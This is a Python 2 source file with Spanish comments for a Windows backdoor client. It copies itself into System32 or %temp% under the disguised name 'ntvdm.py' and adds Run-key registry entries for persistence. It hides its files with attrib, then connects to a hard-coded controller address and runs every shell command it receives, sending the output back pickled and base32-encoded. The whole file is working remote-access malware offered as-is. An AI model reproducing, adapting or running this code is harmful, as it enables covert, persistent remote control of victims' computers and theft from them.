#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
Cliente para correr en sistemas Windows
"""

from sys import argv, stdout
from os.path import exists
from subprocess import Popen, PIPE, STDOUT
from socket import socket, AF_INET, SOCK_STREAM, error
from base64 import b32decode as decode
from base64 import b32encode as encode
from cPickle import dumps, loads
from time import sleep
from datetime import datetime
from os import kill, waitpid
#from signal import SIGKILL
import win32api, win32con
 
class Cliente(object):
    def __init__(self, host="192.168.0.15", port=2236):
 
        self.host = host
        self.port = port
 
        self.localizacion = None
       
        self.__obtenerDirectorios()
 
        infectado = self.__localizar()
 
        if not infectado:
            self.__infectar()
 
        if self.localizacion != None:
            self.__registrar()
            self.__ocultar()
 
        self.__crearSocket()
        self.__conectar()
 
    def __obtenerDirectorios(self):
       
        # Obtenemos %SystemRoot%
        print " [*] Obteniendo system32:",
        p = Popen("cd %SystemRoot%\\system32 && cd", stdout=PIPE, stderr=STDOUT, shell=True)
        stdout, stderr = p.communicate()
        self.system32 = stdout.replace("\r", "").replace("\n", "")
        print self.system32
       
        # Obtenemos %temp%
        print "\n [*] Obteniendo temp:",
        p = Popen("cd %temp% && cd", stdout=PIPE, stderr=STDOUT, shell=True)
        stdout, stderr = p.communicate()
        self.temp = stdout.replace("\r", "").replace("\n", "")
        print self.temp
       
    def __localizar(self):
        print "\n [*] Localizando cliente"
        archivo = self.system32 + "\\mxsys32\\ntvdm.py"
        if exists(archivo):
            self.localizacion = archivo
            print " [+] Cliente localizado en " + archivo
            return True
        else:
            archivo = self.temp + "\\mxsys32\\ntvdm.py"
            if exists(archivo):
                self.localizacion = archivo
                print " [+] Cliente localizado en " + archivo
                return True
            else:
                print " [-] Cliente no localizado"
                return False
 
    def __infectar(self):
        print("\n [+] Comenzando infeccion\n")
        self.__mover()
 
    def __mover(self):
        """
       Crea mxsys32 y mueve el cliente a dicho directorio
       """
 
        try:
            # Creamos directorio mxsys32
            print " [*] Creando mxsys32 en System32"
           
            cmd = "mkdir %s\\mxsys32" % self.system32
           
            p = Popen(cmd, stdout=PIPE, stderr=STDOUT, shell=True)
            stdout, stderr = p.communicate()
           
            if exists(self.system32 + "\\mxsys32"):
                print " [+] OK"
 
                # Movemos cliente
                print " [*] Moviendo cliente"
               
                archivo = self.system32 + "\\mxsys32\\ntvdm.py"
                actual = argv[0]
               
                if not "\\" in actual:
                    # Agregamos path
                    p = Popen("cd", stdout=PIPE, stderr=STDOUT, shell=True)
                    stdout, stderr = p.communicate()
                    actual = stdout.replace("\r", "").replace("\n", "") + "\\" + argv[0]
                   
                cmd = "move \"%s\" \"%s\"" % (actual, archivo)
               
                p = Popen(cmd, stdout=PIPE, stderr=STDOUT, shell=True)
                stdout, stderr = p.communicate()
 
                if not exists(archivo):
                    raise Exception
 
                self.localizacion = archivo
            else:
                raise Exception
       
        except Exception as e:
            print " [!] Error: " + str(e) + "\n"
           
            try:
                # Configuramos %temp%
                print " [*] Creando mxsys32 en temp"
               
                cmd = "mkdir %s\\mxsys32" % self.temp
               
                p = Popen(cmd, stdout=PIPE, stderr=STDOUT, shell=True)
                stdout, stderr = p.communicate()
           
                if exists(self.temp + "\\mxsys32"):
                    print " [+] OK"
 
                    # Movemos cliente
                    print " [*] Moviendo cliente"
                   
                    archivo = self.temp + "\\mxsys32\\ntvdm.py"
                    actual = argv[0]
                   
                    if not "\\" in actual:
                        # Agregamos path
                        p = Popen("cd", stdout=PIPE, stderr=STDOUT, shell=True)
                        stdout, stderr = p.communicate()
                        actual = stdout.replace("\r", "").replace("\n", "") + "\\" + argv[0]
                       
                    cmd = "move \"%s\" \"%s\"" % (actual, archivo)
                   
                    p = Popen(cmd, stdout=PIPE, stderr=STDOUT, shell=True)
                    stdout, stderr = p.communicate()
 
                    if not exists(archivo):
                        raise Exception
 
                    self.localizacion = archivo
                else:
                    raise Exception
            except Exception:
                print " [!] Error\n"
 
    def __registrar(self):
        """
       Intenta crear persistencia al registrar ntvdm.exe en HKCU y HKLM.
       """
 
        errores = 0
 
        registrosSystem32 = [
            "REG ADD HKCU\\Software\\Microsoft\Windows\\CurrentVersion\\Run /v ntvdm /t REG_SZ /d \"python %SystemRoot%\\mxsys32\\ntvdm.py\" /f",
            "REG ADD HKLM\\Software\\Microsoft\Windows\\CurrentVersion\\Run /v ntvdm /t REG_SZ /d \"python %SystemRoot%\\mxsys32\\ntvdm.py\" /f"]
       
        registrosTemp = [
            "REG ADD HKCU\\Software\\Microsoft\Windows\\CurrentVersion\\Run /v ntvdm /t REG_SZ /d \"python %temp%\\System32\\mxsys32\\ntvdm.py\" /f",
            "REG ADD HKLM\\Software\\Microsoft\Windows\\CurrentVersion\\Run /v ntvdm /t REG_SZ /d \"python %temp%\\System32\\mxsys32\\ntvdm.py\" /f"
        ]
 
        print("\n [*] Intentando crear registros")
       
        if self.system32 in self.localizacion:
            registros = registrosSystem32
        elif self.temp in self.localizacion:
            registros  = registrosTemp
        else:
            print " [!] Error\n"
            return
           
        for registro in registros:
            try:
                print("\t- " + registro)
                localerror = 0
                p = Popen(registro, stdout=PIPE, stderr=STDOUT, shell=True)
                stdout, stderr = p.communicate()
 
                exito = "The operation completed successfully"
               
                if exito not in stdout:
                    errores += 1
                    localerror += 1
 
                if stderr:
                    errores += 1
                    localerror += 1
               
                if localerror == 0:
                    print(" [+] OK")
 
            except Exception as e:
                print(" [!] Error: " + str(e))
                errores += 1
 
        if errores > 1:
            print(" [!] Error\n")
        else:
            print(" [+] Registros creados exitosamente")
           
    def __ocultar(self):
        archivo = self.localizacion
        directorio = self.localizacion.replace("\\ntvdm.py", "")
        cmd = "attrib /S /D +A +H +R +A {0}"
       
        try:
            print "\n [*] Ocultando directorio"
            p = Popen(cmd.format(directorio), stdout=PIPE, stderr=STDOUT, shell=True)
            stdout, stderr = p.communicate()
            print " [+] OK"
        except Exception as e:
            print " [!] Error: " + str(e)
 
        try:
            print " [*] Ocultando cliente"
            p = Popen(cmd.format(archivo), stdout=PIPE, stderr=STDOUT, shell=True)
            stdout, stderr = p.communicate()
            print " [+] OK"
        except Exception as e:
            print " [!] Error " + str(e)
 
    def __crearSocket(self):
        try:
            print("\n [*] Creando socket")
            self.socket = socket(AF_INET, SOCK_STREAM)
            print(" [+] OK")
 
        except error as e:
            print(" [!] Error al crear socket: " + str(e))
            self.__esperar()
            self.__crearSocket()
 
    def __conectar(self):
        try:
            print("\n [*] Conectando a {0}:{1}".format(self.host, self.port))
            self.socket.connect((self.host, self.port))
            print(" [+] OK")
            self.__shell()
 
        except error as e:
            print(" [!] Error al conectar: " + str(e))
            try:
                self.__esperar()
            except KeyboardInterrupt:
                exit(" [!] Keyboard Interrupt!")
            self.__conectar()
 
    def __esperar(self):
        for i in range(1, 100):
            tiempo = 100 - i
           
            if tiempo < 10:
                if tiempo == 9:
                    stdout.write("\r                                  ")
                    stdout.flush()
 
                elif tiempo == 1:
                    stdout.write("\r                                  ")
                    stdout.flush()
                    stdout.write("\r [*] Nuevo intento en %s segundo" % tiempo)
                    stdout.flush()
 
                else:
                    stdout.write("\r [*] Nuevo intento en %s segundos" % tiempo)
                    stdout.flush()
 
            else:
                stdout.write("\r [*] Nuevo intento en %s segundos" % tiempo)
                stdout.flush()
           
            sleep(1)
        print("")
       
    def __shell(self):
        while True:
            print "\n [*] Recibiendo"
            try:
                recv = self.socket.recv(1024)
            except error as e:
                print " [!] ERROR: " + str(e)
                self.__enviarError(e)
                continue
 
            print " [*] Decodificando"
            try:
                cmd = decode(loads(recv))
            except Exception as e:
                print " [!] ERROR: " + str(e)
                self.__enviarError(e)
                continue
 
            if cmd == "salir":
                print(" [+] Conexion finalizada por el servidor")
                sleep(10)
                self.__conectar()
 
            print " [*] Pipeando"
            stdout, stderr = self.__ejecutarComando(cmd)
            print " [+] OK"
 
            print " [*] Codificando stdout"
            try:
                if stdout:
                    stdout = encode(stdout)
                    print " [+] OK"
            except Exception as e:
                print " [!] ERROR: " + str(e)
                self.__enviarError(e)
                continue
 
            print " [*] Codificando stderr"
            try:
                if stderr:
                    stderr = encode(stderr)
                    print " [+] OK"
            except Exception as e:
                print " [!] ERROR: " + str(e)
                self.__enviarError(e)
                continue
 
            print " [*] Pickleando"
            try:
                output = dumps([stdout, stderr])
                print " [+] OK"
            except Exception as e:
                print " [!] ERROR: " + str(e)
                self.__enviarError(e)
                continue
 
            output = output + "&&&&"
 
            print " [*] Enviando"
            try:
                self.socket.send(output)
                print " [+] OK"
            except Exception as e:
                print " [!] ERROR: " + str(e)
                self.__enviarError(e)
                continue
           
        self.__salir()
 
    def __ejecutarComando(self, cmd):
        t = 40
        inicio = datetime.now()
        p = Popen(cmd, stdout=PIPE, stderr=STDOUT, shell=True)
        while p.poll() is None:
            sleep(0.1)
            ahora = datetime.now()
            try:
                if (ahora - inicio).seconds > t:
                    kill(p.pid, 9)
                    waitpid(-1, 1)
                    return None, None
            except Exception as e:
                print " [!] Error: " + str(e)
                return None, None
        stdout, stderr = p.communicate()
        return stdout, stderr
 
    def __enviarError(e):
        print " [*] Enviando error"
        try:
            e = encode(str(e))
            stdout, stderr = None, e
            output = dumps([stdout, stderr])
            output = output + "&&&&"
            self.socket.send(output)
           
        except Exception as err:
            print " [!] ERROR: " + str(err)
 
    def __salir(self):
        try:
            print("[*] Finalizando")
            self.socket.close()
            exit()
        except Exception as e:
            print(" [!] Error al salir: " + str(e))
            exit()
 
if __name__ == "__main__":
    if exists("hosts"):
        with open("hosts", "r") as f:
            host = f.readline()
        c = Cliente(host=host)
    else:
        c = Cliente()
